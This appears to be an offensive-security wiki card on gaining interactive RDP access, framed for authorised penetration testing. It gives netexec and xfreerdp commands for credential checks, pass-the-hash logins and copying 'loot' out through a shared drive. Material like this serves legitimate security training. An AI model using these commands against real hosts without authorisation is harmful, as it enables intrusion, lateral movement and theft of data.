---
tool: RDP access
slug: rdp-access
kind: technique
stages: [actions-on-objectives]
category: Interactive access over 3389
platforms: [linux, windows, network]
services: [rdp]
ports: [3389]
tags: [rdp, lateral-movement, pass-the-hash, xfreerdp, remote-access]
attack: [T1021.001, T1550.002]
summary: With a credential and 3389 open, RDP gives a full interactive desktop, the quiet way onto a Windows host when WinRM is shut. xfreerdp drives it from Linux, including pass-the-hash where Restricted Admin is on, with a shared drive to move files.
references:
  - The Hacker Recipes: WinRM/RDP movement | https://www.thehacker.recipes/ad/movement/
  - HackTricks pentesting RDP | https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html
---

## When to reach for it

You have a working credential (or NT hash) for a user who can log in over Remote Desktop, and want a GUI, not just a shell: to run a Windows app, read a session, or stage a local privesc that needs a desktop. Check the credential first with `netexec rdp TARGET -u user -p pass` (a `(Pwn3d!)` means it logs in).

## Connect from Linux

```bash
xfreerdp /u:user /p:'pass' /d:DOMAIN /v:TARGET /dynamic-resolution
```

Add `/cert:ignore` for a self-signed cert. Pass-the-hash when Restricted Admin mode is enabled on the host:

```bash
xfreerdp /u:administrator /pth:NTHASH /v:TARGET /cert:ignore
```

## Move files and clipboard

Mount a local folder as a drive and share the clipboard, so transfers need no second channel:

```bash
xfreerdp /u:user /p:'pass' /v:TARGET /drive:loot,/home/kali/loot +clipboard
```

Inside the session the folder appears under `\\tsclient\loot`.

## Notes

An interactive logon is logged and may disconnect the real user, so confirm RDP use is in scope, avoid kicking an active session where you can, and record the account and host. Pass-the-hash over RDP needs Restricted Admin mode and is itself a finding worth noting. In-scope and authorised use only; anything copied through the shared drive is loot to handle with the engagement data.
